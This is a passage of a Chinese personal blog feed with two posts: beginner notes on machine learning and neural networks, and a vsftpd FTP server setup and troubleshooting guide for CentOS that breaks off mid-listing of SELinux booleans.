    <content type="html"><![CDATA[<p>最近由于一些需要在学习机器学习，B站上找了<a href="https://www.bilibili.com/video/av59606777">一个系列</a>的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。<a id="more"></a></p><h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p><code>机器学习（Machine Learning, ML）</code>是多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或者技能，重新组织已有的知识结构使之不断改善自身的性能。<br>机器学习是<code>人工智能</code>的核心，是使计算机具有智能的根本途径，其应用遍及人工智能的各个领域，主要使用归纳、综合而不是演绎。机器学习、机器学习，那么这里的学习到底指什么样的一个过程呢？</p><blockquote><p>学习：针对经验<code>E</code>和一系列任务<code>T</code>以及一定表现的衡量<code>P</code>，如果随之经验<code>E</code>的积累，针对定义好的任务<code>T</code>可以提高表现<code>P</code>，就说明计算机具有学习能力。 </p></blockquote><p>机器学习被这样定义：探究和开发一系列算法来如何使计算机不需要通过外部明显地知识，而可以通过数据进行学习、建模，并且利用建立的模型对新输入的数据进行预测的学科。</p><p>当今，机器学习已经广为，现在常见并且火热的应用如下：</p><ul><li>语音识别</li><li>自动驾驶</li><li>语言翻译</li><li>计算机视觉</li><li>推荐系统</li><li>无人机</li><li>垃圾邮件识别</li></ul><h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h4><p>机器学习、包括下面提到的深度学习都有自己的一些元素，也算是一些概念，主要是：<code>训练集</code>、<code>测试集</code>、<code>特征值</code>、<code>监督学习</code>、<code>非监督学习</code>、<code>半监督学习</code>、<code>分类</code>、<code>回归</code>。下面对主要概念进行解释：</p><p>概念学习：从有关某个布尔函数的输入输出训练样例中推断出该布尔函数，概念定义在实例集合之上；<br>训练集（<code>training set</code>）：又称训练样例，用来训练、产生模型或算法的数据集；<br>测试集（<code>testing set</code>）：又称测试样例，专门用来测试训练好的模型或算法的数据集；<br>特征向量（<code>feature vector</code>）：属性的集合，通常用一个向量来表示，附属于一个实例；<br>标记（<code>label</code>）：实例类别的标记，即结果的类型，包括正例（positive example）和反例（negative example）;<br>分类（<code>classification</code>）：目标标记为类别型数据（category）;<br>回归（<code>regression</code>）：目标标记为连续性数值（continuous numeric value）;<br>有监督学习（<code>supervised learning</code>）：训练集数据有类别标记，即训练集的样例存在最终的结果；<br>无监督学习（<code>unsupervised learning</code>）：训练集数据无类别标记；<br>半监督学习（<code>semi-supervised learning</code>）：训练集数据部分有类别标记、部分没有类别标记。</p><h4 id="机器学习步骤"><a href="#机器学习步骤" class="headerlink" title="机器学习步骤"></a>机器学习步骤</h4><ul><li>1、把数据集拆分为<code>训练集</code>和<code>测试集</code></li><li>2、用训练集和训练集的<code>特征向量</code>来训练算法</li><li>3、用训练出的算法在测试集上进行评估（可能涉及调整参数，用到<code>验证集</code>（<code>parameter set</code>））</li></ul><h4 id="算法评估"><a href="#算法评估" class="headerlink" title="算法评估"></a>算法评估</h4><p>对一个机器学习算法性能的评估，主要考虑一下五个方面：</p><ul><li>1、<code>准确率</code>：执行结果的准确度</li><li>2、<code>速度</code>：执行速度的快慢</li><li>3、<code>强壮性</code>：数据的个别值缺失时能否对数据进行准确处理</li><li>4、<code>可规模性</code>：数据集很大的时候算法是否仍然有效</li><li>5、<code>可解释性</code>：算法处理数据的结果可解释的程度</li></ul><h3 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h3><p>了解了机器学习的基本知识，再往深里说是<code>深度学习（Deep Learning, DL）</code>，它是基于机器学习延伸出的一个新领域，由以人脑结构为启发的<code>神经网络算法（NNs）</code>为起源加之模型结构深度的增加发展，并伴随大数据和计算能力的提高而产生的一系列算法。<br>深度学习被广泛应用于图像处理与计算机视觉、自然语言处理以及语音识别等领域。</p><p>对于深度学习，主要对<code>神经网络</code>相关的算法进行学习，这也是目前应用最为广泛的机器学习算法了。</p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p><code>神经网络</code>（<code>NNs</code>），也称<code>人工神经网络</code>（<code>Artificial Neural Networks</code>，简写为<code>ANNs</code>）或称作<code>连接模型</code>（<code>Connection Model</code>），它是一种模仿动物神经网络行为特征，进行分布式并行信息处理的算法数学模型。这种网络依靠系统的复杂程度，通过调整内部大量节点之间相互连接的关系，从而达到处理信息的目的。</p><p>它机器学习得以发展出深度学习的关键所在，以人脑中的神经网络为启发产生的机器学习算法。</p><h4 id="多层向前神经网络-Muiltilayer-Feed-Forward-Neural-Network"><a href="#多层向前神经网络-Muiltilayer-Feed-Forward-Neural-Network" class="headerlink" title="多层向前神经网络(Muiltilayer Feed-Forward Neural Network)"></a>多层向前神经网络(Muiltilayer Feed-Forward Neural Network)</h4><p>主要有三部分组成：<code>输入层</code>（<code>input layer</code>），<code>隐藏层</code>（<code>hidden layers</code>），<code>输出层</code>（<code>output layer</code>）</p><p><img src="http://ggb0n.cool/images/NN01.png" alt=""></p><p>每层由<code>单元</code>（<code>unit</code>，也称为<code>神经元</code>）组成，输入层将训练集的实例特征向量进行传入，经过连接结点的<code>权重</code>（<code>weight</code>）传入下一层，上一层的输出是下一层的输入。隐藏层的数量是任意的，输入层和输出层只有一层，不过一般算层数时不将输入层计算在内。</p><p>其工作过程大致是：将输入的实例值进行加权求和，再经过非线性方程转化输出到下一层。理论上讲，当隐藏层足够多、训练集足够大时，可以模拟出任何方程。</p><h4 id="设计神经网络结构"><a href="#设计神经网络结构" class="headerlink" title="设计神经网络结构"></a>设计神经网络结构</h4><p>使用神经网络训练数据之前，必须确定神经网络的层数，以及每层单元的个数。</p><p>特征向量在被传入输入层时通常被先<code>标准化</code>（<code>normalize</code>）到<code>0</code>和<code>1</code>之间，目的是加速学习的过程，但是输入的特征值类型可能是<code>离散型</code>的，也可能是<code>连续型</code>的。对于离散型的变量，可以通过编码成每一个输入单元对应一个特征值可能赋的值。例如</p><blockquote><p>特征值<code>A</code>可能取三个值<code>（a0、a1、a2）</code>，那么可以使用<code>3</code>个输入单元来表示<code>A</code>。如果<code>A=a0</code>，则表示<code>a0</code>的单元值取<code>1</code>，其余取<code>0</code>；如果<code>A=a1</code>，则表示<code>a1</code>的单元值取<code>1</code>，其余取<code>0</code>。</p></blockquote><p>神经网络既可以解决<code>分类问题</code>，也可以解决<code>回归问题</code>。分类问题即为结果是离散型的问题，比如预测哪个品牌的电脑卖得更好；回归问题即结果是连续型的问题，比如预测某地的房价。<br>分类问题居多，因此主要学习分类问题的解决，对于该类问题，如果是两类，用一个输出单元表示即可，即<code>0</code>和<code>1</code>；多于两类则每一个类别用一个输出单元表示，因此输出层的单元数量通常等于类别的数量。</p><p>对于隐藏层数的设置，如果没有明确规则，则可以根据实验测试和误差，以及准确度来实验并作出调整。准确度的测试可以利用测试集来进行测试。不过还有一种常用的测试方法：<code>交叉验证方法</code>。</p><h4 id="交叉验证方法（Cross-Validation）"><a href="#交叉验证方法（Cross-Validation）" class="headerlink" title="交叉验证方法（Cross-Validation）"></a>交叉验证方法（Cross-Validation）</h4><p>将数据集分为<code>n</code>份，第一次将第一份作为测试集其余作为训练集进行训练和测试，第二层选择第二份作为测试集其余作为训练集进行训练和测试，依次类推进行。</p><p><img src="http://ggb0n.cool/images/NN02.png" alt=""></p><h4 id="Backpropagation算法"><a href="#Backpropagation算法" class="headerlink" title="Backpropagation算法"></a>Backpropagation算法</h4><p>该算法可以说是其他神经网络算法的基本，通过<code>迭代性</code>的训练集输入来处理训练集中的实例，对比通过神经网络处理后输出层的预测值与训练集真实值之间的差，来<code>反向地</code>以最小化误差调节每个连接之间的权重，以此方式逐渐地进行训练。</p><p>算法的要素如下：</p><blockquote><p>输入：数据集<code>D</code>、学习率<code>L</code>、一个多层向前神经网络<br>输出：一个训练好的神经网络<br>起始状态时需要初始化<code>权重</code>、<code>偏向</code>（<code>Bias</code>，每个单元都有一个偏向，相当于上层传到当前结点的一个偏移）：随机初始化值在<code>-1</code>到<code>1</code>之间，或者<code>-0.5</code>到<code>0.5</code>之间。</p></blockquote><p>对于一个训练实例，执行以下步骤：</p><ul><li>1、由输入层向前传送，传送时需要对每个单元进行加权，然后加上传入到的目标结点的偏向值，最后对加权值进行非线性的转化，然后传送给下层结点。如下图：</li></ul><p><img src="http://ggb0n.cool/images/NN03.png" alt=""></p><ul><li>2、根据误差进行反向传送</li></ul><p><img src="http://ggb0n.cool/images/NN04.png" alt=""></p><ul><li>3、按照上述两步，输出训练集不同的数据进行多次的向前传送和反向传送进行更新，终止条件：<ul><li>权重的更新低于某个阈值</li><li>预测的错误率低于某个阈值</li><li>达到预设一定的循环次数</li></ul></li></ul><h4 id="非线性转化方程"><a href="#非线性转化方程" class="headerlink" title="非线性转化方程"></a>非线性转化方程</h4><p><code>sigmoid</code>函数（<code>S曲线</code>）用来作为转化方程，sigmoid函数曲线形如下图：</p><p><img src="http://ggb0n.cool/images/NN05.png" alt=""></p><p>通常有两种：<a href="[https://zh.wikipedia.org/wiki/%E5%8F%8C%E6%9B%B2%E5%87%BD%E6%95%B0](https://zh.wikipedia.org/wiki/双曲函数)">双曲函数</a>和<a href="https://zh.wikipedia.org/wiki/%E9%82%8F%E8%BC%AF%E5%87%BD%E6%95%B8">逻辑函数</a></p><p>关于机器学习的知识很多，我主要学习一些神经网络的东西，后面会继续记录。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近由于一些需要在学习机器学习，B站上找了&lt;a href=&quot;https://www.bilibili.com/video/av59606777&quot;&gt;一个系列&lt;/a&gt;的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。
    
    </summary>
    
    
      <category term="机器学习" scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>FTP服务器搭建及典型问题的解决</title>
    <link href="http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"/>
    <id>http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</id>
    <published>2020-04-03T01:59:36.000Z</published>
    <updated>2020-04-22T00:14:03.093Z</updated>
    
    <content type="html"><![CDATA[<p>SSH管理远程Linux服务器少不了文件的传输，虽然<code>lrzsz</code>能够解决本地与远程服务器之间文件传输的问题，使用<code>sz/rz</code>即可，比如：<a id="more"></a></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">sz filename #发送一个文件到本地</span><br><span class="line">sz filename1 filename2 #发送多个文件到本地</span><br><span class="line">sz dir/* #发送dir目录下的所有文件，不包含dir下的文件夹</span><br></pre></td></tr></table></figure><p>从本地传文件到服务器在终端输入<code>rz</code>即可。参考<a href="https://blog.51cto.com/skypegnu1/1538371">这里</a>。</p><p>但是<code>lrzsz</code>处理小文件可以，处理大文件效果就不太好，因此，可以选择另一种方式，没错，搭建一个FTP服务器。而且FTP服务器能支持多人对文件的共享。</p><h3 id="搭建FTP服务器"><a href="#搭建FTP服务器" class="headerlink" title="搭建FTP服务器"></a>搭建FTP服务器</h3><p>我的服务器是CentOS的，因此下面的配置以CentOS下的配置为例，不过其他Linux系统大同小异，根据个人情况配置即可。</p><h4 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h4><p>Linux下轻便的的ftp程序应该就是vsftpd了，这里我们直接yum安装：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yum install -y vsftpd</span><br></pre></td></tr></table></figure><h4 id="配置vsftpd"><a href="#配置vsftpd" class="headerlink" title="配置vsftpd"></a>配置vsftpd</h4><p>vsftpd的配置目录为<code>/etc/vsftpd</code>，包含下列的配置文件：</p><ul><li><code>vsftpd.conf</code>为主要配置文件</li><li><code>ftpusers</code>配置禁止访问 FTP 服务器的用户列表</li><li><code>user_list</code>配置用户访问控制</li></ul><p>这里我们主要对<code>vsftpd.conf</code>进行配置，这里可以先用下面这条命令看初始的配置有哪些：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/vsftpd/vsftpd.conf | grep -v "#" | <span class="built_in">more</span></span><br></pre></td></tr></table></figure><p>各项配置的规则如下：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启匿名登录</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许使用本地帐户进行FTP用户登录验证</span></span><br><span class="line"><span class="attr">local_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许写</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 设置本地用户默认文件掩码022</span></span><br><span class="line"><span class="attr">local_umask</span>=<span class="number">022</span></span><br><span class="line"><span class="comment"># 允许匿名上传</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许匿名创建新目录</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 同时开放其它权限</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 可以发送消息当访问某个目录时</span></span><br><span class="line"><span class="attr">dirmessage_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启上传下载记录</span></span><br><span class="line"><span class="attr">xferlog_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 数据链通过20端口建立</span></span><br><span class="line"><span class="attr">connect_from_port_20</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许其它用户上传匿名文件</span></span><br><span class="line"><span class="comment">#chown_uploads=YES</span></span><br><span class="line"><span class="comment"># 所有用户</span></span><br><span class="line"><span class="comment">#chown_username=whoever</span></span><br><span class="line"><span class="comment"># 日志保存到</span></span><br><span class="line"><span class="comment">#xferlog_file=/var/log/xferlog</span></span><br><span class="line"><span class="comment"># 日志标准输出</span></span><br><span class="line"><span class="attr">xferlog_std_format</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 空闲会话时间</span></span><br><span class="line"><span class="comment">#idle_session_timeout=600</span></span><br><span class="line"><span class="comment"># 数据连接超时时间</span></span><br><span class="line"><span class="comment">#data_connection_timeout=120</span></span><br><span class="line"><span class="comment"># 隔离的安全用户</span></span><br><span class="line"><span class="comment">#nopriv_user=ftpsecure</span></span><br><span class="line"><span class="comment"># 开启异步数据线程</span></span><br><span class="line"><span class="comment">#async_abor_enable=YES</span></span><br><span class="line"><span class="comment"># 开启ASCII协议上传</span></span><br><span class="line"><span class="attr">ascii_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启ASCII协议下载</span></span><br><span class="line"><span class="attr">ascii_download_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启邮箱验证</span></span><br><span class="line"><span class="comment">#deny_email_enable=YES</span></span><br><span class="line"><span class="comment"># 拒绝的邮箱列表</span></span><br><span class="line"><span class="comment">#banned_email_file=/etc/vsftpd/banned_emails</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否允许直接获取子目录信息</span></span><br><span class="line"><span class="comment">#ls_recurse_enable=YES</span></span><br><span class="line"><span class="comment"># 监听IPv4</span></span><br><span class="line"><span class="attr">listen</span>=<span class="literal">NO</span></span><br><span class="line"><span class="comment"># 监听IPv6和监听IPv4</span></span><br><span class="line"><span class="attr">listen_ipv6</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户启用pam认证</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="comment"># 用户组管理</span></span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 访问控制</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允使用被动模式</span></span><br><span class="line"><span class="attr">pasv_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 指定使用被动模式时打开端口的最小值</span></span><br><span class="line"><span class="attr">pasv_min_port</span>=<span class="number">10060</span></span><br><span class="line"><span class="comment"># 指定使用被动模式时打开端口的最大值。</span></span><br><span class="line"><span class="attr">pasv_max_port</span>=<span class="number">10090</span></span><br><span class="line"><span class="comment"># 用户宽带限制200kps</span></span><br><span class="line"><span class="comment">#local_max_rate=200000</span></span><br><span class="line"><span class="comment"># 登录后欢迎内容</span></span><br><span class="line"><span class="attr">ftpd_banner</span>=Welcome to My FTP service.</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------开启虚拟用户组参数--------</span></span><br><span class="line"><span class="comment"># 开启虚拟用户</span></span><br><span class="line"><span class="attr">guest_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 主虚拟用户名vsftpd，等下会建立</span></span><br><span class="line"><span class="attr">guest_username</span>=vsftpd</span><br><span class="line"><span class="comment"># 虚拟用户配置（可以对每一个虚拟用户进行单独的权限配置）</span></span><br><span class="line"><span class="attr">user_config_dir</span>=/etc/vsftpd/vconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用限定用户在其主目录下</span></span><br><span class="line"><span class="attr">chroot_local_user</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启用户列表chroot管理</span></span><br><span class="line"><span class="attr">chroot_list_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># chroot管理的用户列表（一行一用户,虚拟用户都要添加进去）</span></span><br><span class="line"><span class="comment"># 当设置用户只能在登录目录时，chroot管理的用户为不受限制，否则相反</span></span><br><span class="line"><span class="attr">chroot_list_file</span>=/etc/vsftpd/chroot_list</span><br><span class="line"><span class="comment"># 允许chroot管理用户进行写操作</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------虚拟用户高级参数（请选择一组）--------</span></span><br><span class="line"><span class="comment"># 虚拟用户和本地用户有相同的权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户和匿名用户有相同的权限，默认是NO</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户具有写权限（上传、下载、删除、重命名）</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户不能浏览目录，只能上传文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能上传和下载文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载文件和创建文件夹，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载、删除和重命名文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br></pre></td></tr></table></figure><p>而我们不一定每项都进行配置，在初始的基础之上，进行如下配置即可：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上面已经给了全部配置的含义，自己比对即可</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">local_root</span>=/data/ftp/ <span class="comment">#给ftp账户指定主目录</span></span><br><span class="line"><span class="attr">listen_port</span>=<span class="number">60021</span> <span class="comment">#这里也可以不设置，默认ftp是21端口</span></span><br></pre></td></tr></table></figure><p>配置完之后保存，然后重启vsftpd。</p><h4 id="创建FTP用户"><a href="#创建FTP用户" class="headerlink" title="创建FTP用户"></a>创建FTP用户</h4><p>首先创建一个新账户<code>ftpuser</code>：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">useradd ftpuser</span><br></pre></td></tr></table></figure><p>然后为其设置密码：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">passwd ftpuser</span><br></pre></td></tr></table></figure><p>现在这个账户其实是一个可登录的Linux用户，为了安全，我们要限制用户的权限，不能让其登录linux而只能用于登录FTP服务器：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -s /sbin/nologin ftpuser</span><br></pre></td></tr></table></figure><h4 id="指定主目录"><a href="#指定主目录" class="headerlink" title="指定主目录"></a>指定主目录</h4><p>前面配置文件里看到了我们为ftp用户指定了主目录<code>/data/ftp</code>，但是初始情况该目录可能不存在，需要新建文件目录：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chmod a-w /data/ftp &amp;&amp; chmod <span class="number">777</span> -R /data/ftp/pub</span><br></pre></td></tr></table></figure><p>这里同时也为目录设置了权限，可以看到<code>pub</code>目录是<code>777</code>权限，文件的上传、下载也就在此目录之下了。</p><p>然后设置为用户主目录：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -d /data/ftp ftpuser</span><br></pre></td></tr></table></figure><h4 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h4><p>前面的<code>listen_port</code>如果更改的话，也要在防火墙来开放其端口：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">60021</span>/tcp --permanent</span><br></pre></td></tr></table></figure><p>然后重启防火墙：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure><p>至此，基础的配置也就完毕了，下面进行测试。</p><h3 id="测试服务器及问题发现"><a href="#测试服务器及问题发现" class="headerlink" title="测试服务器及问题发现"></a>测试服务器及问题发现</h3><p>连接FTP服务器可以选用一些FTP客户端软件：<code>FileZilla Client</code>、<code>CuteFTP</code>等很多，我用了<code>FileZilla Client</code>进行测试。</p><p>这里由于FTP的连接有两种模式：<code>主动（POST）</code>和<code>被动（PASV）</code>两种模式：</p><blockquote><p>POST模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。</p><p>PASV模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。</p></blockquote><p>按照前面的基础配置在测试时发现主动和被动模式登录都存在问题</p><h4 id="主动模式连接的问题"><a href="#主动模式连接的问题" class="headerlink" title="主动模式连接的问题"></a>主动模式连接的问题</h4><p>首次连接发现可以登录，但是读取目录列表失败，报错情况如下：<br><img src="http://ggb0n.cool/images/ftp2.png" alt=""></p><p>根据报错提示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">状态:已登录</span><br><span class="line">状态:读取目录列表...</span><br><span class="line">命令:PWD</span><br><span class="line">响应:257 &quot;&#x2F;data&#x2F;ftp&quot;</span><br><span class="line">命令:TYPE I</span><br><span class="line">响应:200 Switching to Binary mode.</span><br><span class="line">命令:PORT xx,xx,xx,xx,216,94</span><br><span class="line">响应:500 Illegal PORT command.</span><br><span class="line">命令:PASV</span><br><span class="line">响应:227 Entering Passive Mode (xx,xx,xx,xx,227,27).</span><br><span class="line">命令:LIST</span><br><span class="line">错误:20 秒后无活动，连接超时</span><br><span class="line">错误:读取目录列表失败</span><br></pre></td></tr></table></figure><p>根据报错日志，不难理解，当成功登录之后，进行目录读取，其实也就是数据传输的时候，因为是主动模式，服务器会主动向客户端这边进行连接，即向<code>21694</code>端口进行连接，然后就报错了，根本原因应该就是客户端机器的防火墙对该端口并没有开放，因此连接肯定是失败的。然后又采用了被动模式进行连接，即服务器开放<code>22727</code>端口等待客户端连接，然而还是失败了，原因何在呢？</p><p>由于一些客观原因，我没有对自己的客户机的防火墙进行更改，而是换用被动模式，当然，也遇到了一些问题。</p><h4 id="被动模式连接的问题"><a href="#被动模式连接的问题" class="headerlink" title="被动模式连接的问题"></a>被动模式连接的问题</h4><p>采用被动连接的方式，首先需要在<code>vsftpd.conf</code>下进行如下配置：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pasv_enable=YES#开启被动模式</span><br><span class="line">pasv_min_port=<span class="number">44550</span>#指定被动模式最小端口</span><br><span class="line">pasv_max_port=<span class="number">44551</span>#指定被动模式最大端口</span><br><span class="line">pasv_promiscuous=YES #关闭被动模式的安全检查(这个检查可以确保数据连接源于同一IP地址)</span><br></pre></td></tr></table></figure><p>重启<code>vsftpd</code>服务</p><p>支持了被动模式，并且指定了端口开放范围，那么我们在防火墙进行端口的配置即可。</p><p>重启防火墙，然后再次测试：<br><img src="http://ggb0n.cool/images/ftp3.png" alt=""></p><p>可以看到目录成功列举了，问题得到解决。</p><h4 id="上传文件失败的问题"><a href="#上传文件失败的问题" class="headerlink" title="上传文件失败的问题"></a>上传文件失败的问题</h4><p>当能成功登录、成功列举目录了之后，最主要的目的当然是文件的上传和下载了，然后当去测试的时候，又出现了问题：<br><img src="http://ggb0n.cool/images/ftp4.png" alt=""></p><p>报错：<code>553 Could not create file.</code></p><p>本来想着很简单，应该是文件夹权限的问题，但是对文件夹改了777，甚至<code>/data</code>都改成777了还是不行，后来查资料，网上说可能是<code>SELinux</code>的问题，这是个什么呢？</p><blockquote><p>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。NSA是在Linux社区的帮助下开发了一种访问控制体系，在这种访问控制体系的限制下，进程只能访问那些在他的任务中所需要文件。 –百科</p><p>SELinux 主要作用就是<strong>最大限度地减小系统中服务进程可访问的资源</strong>（最小权限原则）。</p><p>这里有一篇不错的<a href="https://zhuanlan.zhihu.com/p/30483108">文章</a>可以参考。</p></blockquote><p>那么我们关闭SELinux试试：<code>setenforce 0</code>，然后测试一下看看：<br><img src="http://ggb0n.cool/images/ftp5.png" alt=""></p><p>果然成了，那就是它的问题了，下面就对其进行配置<br>先看一下权限：<code>getsebool -a | grep ftpd</code></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网上是这样的</span></span><br><span class="line">allow_ftpd_anon_write --&gt; off</span><br><span class="line">allow_ftpd_full_access --&gt; off</span><br><span class="line">allow_ftpd_use_cifs --&gt; off</span><br><span class="line">allow_ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br><span class="line">ftp_home_dir --&gt; off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是我的服务器是这样的</span></span><br><span class="line">ftpd_anon_write --&gt; off</span><br><span class="line">ftpd_connect_all_unreserved --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_full_access --&gt; off</span><br><span class="line">ftpd_use_cifs --&gt; off</span><br><span class="line">ftpd_use_fusefs --&gt; 